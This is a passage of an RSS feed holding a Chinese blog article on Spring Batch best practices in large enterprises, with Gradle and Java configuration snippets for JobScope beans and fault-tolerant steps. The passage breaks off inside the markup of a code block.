        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109770&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt; 1 评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Sat, 14 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-14-109770-25657024a.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-14-109770-25657024a.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>Spring Batch 在大型企业中的最佳实践</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;在大型企业中，由于业务复杂、数据量大、数据格式不同、数据交互格式繁杂，并非所有的操作都能通过交互界面进行处理。而有一些操作需要定期读取大批量的数据，然后进行一系列的后续处理。这样的过程就是“批处理”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/ca3bd66122fe7512a89fdfcac747d9fb.jpg&quot; alt=&quot;database-schema&quot; width=&quot;700&quot; height=&quot;611&quot;&gt;&lt;/p&gt;
&lt;p&gt;批处理应用通常有以下特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据量大，从数万到数百万甚至上亿不等；&lt;/li&gt;
&lt;li&gt;整个过程全部自动化，并预留一定接口进行自定义配置；&lt;/li&gt;
&lt;li&gt;这样的应用通常是周期性运行，比如按日、周、月运行；&lt;/li&gt;
&lt;li&gt;对数据处理的准确性要求高，并且需要容错机制、回滚机制、完善的日志监控等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;什么是Spring batch&lt;/h3&gt;
&lt;p&gt;Spring batch是一个轻量级的全面的批处理框架，它专为大型企业而设计，帮助开发健壮的批处理应用。Spring batch为处理大批量数据提供了很多必要的可重用功能，比如日志追踪、事务管理、job执行统计、重启job和资源管理等。同时它也提供了优化和分片技术用于实现高性能的批处理任务。&lt;/p&gt;
&lt;p&gt;它的核心功能包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事务管理&lt;/li&gt;
&lt;li&gt;基于块的处理过程&lt;/li&gt;
&lt;li&gt;声明式的输入/输出操作&lt;/li&gt;
&lt;li&gt;启动、终止、重启任务&lt;/li&gt;
&lt;li&gt;重试/跳过任务&lt;/li&gt;
&lt;li&gt;基于Web的管理员接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;笔者所在的部门属于国外某大型金融公司的CRM部门，在日常工作中我们经常需要开发一些批处理应用，对Spring Batch有着丰富的使用经验。近段时间笔者特意总结了这些经验。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://insights.thoughtworkers.org/wp-content/uploads/2017/01/spring-batch.jpg&quot;&gt;&lt;img src=&quot;/images/jobbole.com/c621a7d6449fc102c5d52b724d3233a3.jpg&quot; alt=&quot;spring batch&quot; width=&quot;700&quot; height=&quot;400&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;使用Spring Batch 3.0以及Spring Boot&lt;/h3&gt;
&lt;p&gt;在使用Spring Batch时推荐使用最新的Spring Batch 3.0版本。相比Spring Batch2.2，它做了以下方面的提升：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持JSR-352标准&lt;/li&gt;
&lt;li&gt;支持Spring4以及Java8&lt;/li&gt;
&lt;li&gt;增强了Spring Batch Integration的功能&lt;/li&gt;
&lt;li&gt;支持JobScope&lt;/li&gt;
&lt;li&gt;支持SQLite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;支持Spring4和Java8是一个重大的提升。这样就可以使用Spring4引入的Spring boot组件，从而开发效率方面有了一个质的飞跃。引入Spring-batch框架只需要在build.gradle中加入一行代码即可：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46529923143549&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
compile(&quot;org.springframework.boot:spring-boot-starter-batch&quot;)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46529923143549-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46529923143549-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;org.springframework.boot:spring-boot-starter-batch&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0003 seconds] --&gt;
&lt;p&gt;而增强Spring Batch Integration的功能后，我们就可以很方便的和Spring家族的其他组件集成，还可以以多种方式来调用job，也支持远程分区操作以及远程块处理。&lt;/p&gt;
&lt;p&gt;而支持JobScope后我们可以随时为对象注入当前Job实例的上下文信息。只要我们指定Bean的scope为job scope，那么就可以随时使用jobParameters和jobExecutionContext等信息。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46533287655388&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
@Component
@JobScope
public class CustomClass {

    @Value(&quot;#{jobParameters[jobDate]}&quot;)
    private String jobDate;

    @Value(&quot;#{jobExecutionContext[&#39;input.name&#39;]}.&quot;)
    private String fileName;
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46533287655388-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46533287655388-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46533287655388-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46533287655388-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46533287655388-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46533287655388-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46533287655388-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46533287655388-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46533287655388-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46533287655388-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46533287655388-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Component&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46533287655388-2&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;JobScope&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46533287655388-3&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;CustomClass&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46533287655388-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46533287655388-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;#{jobParameters[jobDate]}&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46533287655388-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;jobDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46533287655388-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46533287655388-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;#{jobExecutionContext[&#39;input.name&#39;]}.&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46533287655388-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fileName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46533287655388-10&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0010 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;使用Java Config而不是xml的配置方式&lt;/h3&gt;
&lt;p&gt;之前我们在配置job和step的时候都习惯用xml的配置方式，但是随着时间的推移发现问题颇多。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xml文件数急剧膨胀，配置块长且复杂，可读性很差；&lt;/li&gt;
&lt;li&gt;xml文件缺少语法检查，有些低级错误只有在运行集成测试的时候才能发现；&lt;/li&gt;
&lt;li&gt;在xml文件中进行代码跳转时IDE的支持力度不够；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们渐渐发现使用纯Java类的配置方式更灵活，它是类型安全的，而且IDE的支持更好。在构建job或step时采用的流式语法相比xml更加简洁易懂。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46538450832378&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
@Bean
public Step step(){
    return stepBuilders.get(&quot;step&quot;)
        .chunk(1)
        .reader(reader())
        .processor(processor())
        .writer(writer())
        .listener(logProcessListener())
        .faultTolerant()
        .skipLimit(10)
        .skip(UnknownGenderException.class)
        .listener(logSkipListener())
        .build();
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46538450832378-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46538450832378-14&quot;&gt;14&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Bean&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-2&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Step &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;step&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stepBuilders&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;step&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;processor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;processor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;listener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;logProcessListener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46538450832378-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;faultTolerant&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46538450832378-10&quot;&gt;
